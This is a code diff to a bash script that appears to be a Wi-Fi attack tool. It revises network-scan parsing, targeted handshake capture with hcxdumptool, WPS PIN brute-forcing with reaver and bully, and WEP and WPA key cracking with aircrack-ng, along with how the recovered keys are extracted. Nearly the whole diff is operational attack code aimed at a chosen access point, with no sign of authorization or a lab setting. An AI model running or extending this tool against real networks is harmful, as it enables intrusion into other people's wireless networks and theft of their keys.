@@ -202,26 +202,38 @@ cmd_scan() {
     [ -n "$raw" ] || die "scan returned no data; interface busy?"
 
     mkdir -p "$BBT_DIR"
+    [ -L "$BBT_DIR" ] && die "refusing symlinked output directory: $BBT_DIR"
+    [ -L "$CACHE" ] || [ -L "$CACHE.raw" ] \
+        && die "refusing symlinked scan cache: $CACHE"
     printf '%s\n' "$raw" | awk -v OFS='\t' '
+        function tochan(f) {
+            if (f >= 2412 && f <= 2484) return (f == 2484) ? 14 : int((f - 2407) / 5)
+            if (f >= 5000 && f < 5925) return int((f - 5000) / 5)
+            if (f >= 5950 && f <= 7125) return int((f - 5950) / 5)
+            return "?"
+        }
         function flush() {
             if (ssid == "" || bssid == "") return
+            if (ch == "?" && freq > 0) ch = tochan(freq)
+            if (sec == "OPEN" && priv) sec = "WEP"
             print bssid, ssid, ch, freq, band, sig, sec, wps
         }
         /^BSS / {
             flush()
             bssid = $2; sub(/\(.*/, "", bssid)
-            ssid = ""; ch = "?"; freq = 0; band = "?"; sig = "?"; sec = "OPEN"; wps = 0
+            ssid = ""; ch = "?"; freq = 0; band = "?"; sig = "?"; sec = "OPEN"
+            wps = 0; priv = 0
             next
         }
         /^[[:space:]]*freq:/ { freq = $2 + 0; band = (freq < 3000) ? "2.4GHz" : ((freq < 5925) ? "5GHz" : "6GHz") }
         /^[[:space:]]*signal:/ { sig = $2 }
         /^[[:space:]]*SSID:/ { sub(/^[[:space:]]*SSID:[[:space:]]*/, ""); ssid = $0 }
         /^[[:space:]]*DS Parameter set:/ { ch = $NF }
+        /^[[:space:]]*capability:/ { if ($0 ~ /Privacy/) priv = 1 }
         /^[[:space:]]*RSN:/ { sec = "WPA2" }
-        /^[[:space:]]*WPA:/ { sec = "WPA" }
+        /^[[:space:]]*WPA:/ { if (sec == "OPEN") sec = "WPA" }
         /^[[:space:]]*WPS:/ { wps = 1 }
-        /SAE/ { if (sec == "WPA2" || sec == "WPA") sec = "WPA3" }
-        /^[[:space:]]*Privacy:/ { if (sec == "OPEN") sec = "WEP" }
+        /^[[:space:]]*\*?[[:space:]]*Authentication suites:.*SAE/ { sec = "WPA3" }
         END { flush() }
     ' >"$CACHE.raw"
 
@@ -427,22 +439,22 @@ hcx_is_v7() { hcxdumptool -h 2>&1 | grep -q -- '--bpfc'; }
 
 capture_hcx() {
     local iface=$1 bssid=$2 timeout_s=$3 freq=$4 active=$5 out=$6 log=$7
-    local minutes=$(( (timeout_s + 59) / 60 )) mode=passive
+    local mode=passive
     if hcx_is_v7; then
-        local -a args=(-i "$iface" -w "$out" --tot="$minutes" --exitoneapol=3)
+        local -a args=(-i "$iface" -w "$out" --tot="$timeout_s" --exitoneapol=3)
         [ -n "$freq" ] && [ "$freq" != 0 ] && [ "$freq" != "?" ] && args+=(-f "$freq")
         if hcxdumptool --bpfc="wlan addr3 $(hex_bssid "$bssid")" >"$RUN/target.bpf" 2>/dev/null \
            && [ -s "$RUN/target.bpf" ]; then
             args+=(--bpf="$RUN/target.bpf")
         fi
         if [ "$active" = 1 ]; then
-            args+=(--associationmax=100)
+            args+=(--associationmax=3)
             mode=active
         else
             args+=(--associationmax=0 --proberesponsetx=0 --disable_disassociation)
             mode=passive
         fi
-        info "hcxdumptool 7.x, BPF-scoped $mode capture (${minutes}m)"
+        info "hcxdumptool 7.x, BPF-scoped $mode capture (${timeout_s}s)"
         timeout "$((timeout_s + 90))" hcxdumptool "${args[@]}" >"$log" 2>&1 || true
     else
         printf '%s\n' "$(hex_bssid "$bssid")" >"$RUN/filter-ap.txt"
@@ -485,11 +497,12 @@ wps_attack() {
     timeout "$timeout_s" reaver -i "$mon" -b "$bssid" -c "$channel" -K 1 -vv -N \
         >"$RUN/reaver.log" 2>&1 || true
     local psk
-    psk=$(awk -F"'" '/WPA PSK|WPS PIN/{print $2}' "$RUN/reaver.log" | tail -n1)
+    psk=$(sed -nE "s/.*WPA PSK:[[:space:]]*'([^']*)'.*/\1/p" "$RUN/reaver.log" | tail -n1)
     if [ -z "$psk" ] && have bully; then
         info "trying bully"
         timeout "$timeout_s" bully -b "$bssid" -c "$channel" "$mon" -d >"$RUN/bully.log" 2>&1 || true
-        psk=$(awk -F"'" '/key|PIN/{print $2}' "$RUN/bully.log" | tail -n1)
+        psk=$(sed -nE "s/.*[Kk]ey:[[:space:]]*'([^']*)'.*/\1/p" "$RUN/bully.log" | tail -n1)
+        [ -n "$psk" ] || psk=$(sed -nE 's/.*[Kk]ey:[[:space:]]*"([^"]*)".*/\1/p' "$RUN/bully.log" | tail -n1)
     fi
     [ -n "$psk" ] && printf '%s' "$psk"
 }
@@ -513,7 +526,8 @@ wep_attack() {
     capfile=$(ls "$RUN"/wep-*.ivs 2>/dev/null | head -n1)
     if [ -z "$capfile" ]; then warn "no WEP capture produced"; return 1; fi
     aircrack-ng -b "$bssid" "$capfile" 2>&1 | tee "$RUN/aircrack.log" >/dev/null
-    awk -F: '/KEY FOUND/{gsub(/ /,"",$2); print $2}' "$RUN/aircrack.log" | tail -n1
+    awk '/KEY FOUND/{sub(/.*\[[[:space:]]*/, ""); sub(/[[:space:]]*\].*/, ""); print}' \
+        "$RUN/aircrack.log" | tail -n1
 }
 
 legacy_handshake() {
@@ -549,7 +563,8 @@ legacy_handshake() {
     fi
     info "aircrack-ng against $(basename "$capfile")"
     aircrack-ng -w "$wordlist" -b "$bssid" "$capfile" 2>&1 | tee "$RUN/aircrack.log" >/dev/null
-    awk -F: '/KEY FOUND/{gsub(/ /,"",$2); print $2}' "$RUN/aircrack.log" | tail -n1
+    awk '/KEY FOUND/{sub(/.*\[[[:space:]]*/, ""); sub(/[[:space:]]*\].*/, ""); print}' \
+        "$RUN/aircrack.log" | tail -n1
 }
 
 # ---------------------------------------------------------------------------
@@ -625,6 +640,7 @@ cmd_attack() {
     fi
     : "${security:=WPA2}"
     [ -n "$channel" ] || channel=auto
+    [ "$channel" = "?" ] && channel=auto
 
     [ "$method" = auto ] && method=$(pick_method "$security" "${wps:-0}")
     if [ "$dry" = 1 ]; then
@@ -645,7 +661,9 @@ cmd_attack() {
     fi
 
     RUN="$BBT_DIR/$(slug "$ssid")-$(date +%Y%m%d-%H%M%S)"
-    mkdir -p "$RUN"
+    mkdir -p "$BBT_DIR"
+    [ -L "$BBT_DIR" ] && die "refusing symlinked output directory: $BBT_DIR"
+    mkdir -m 700 "$RUN" || die "cannot create $RUN"
     ln -sfn "$RUN" "$BBT_DIR/latest"
     trap restore_iface EXIT INT TERM
     exec > >(tee -a "$RUN/run.log") 2>&1
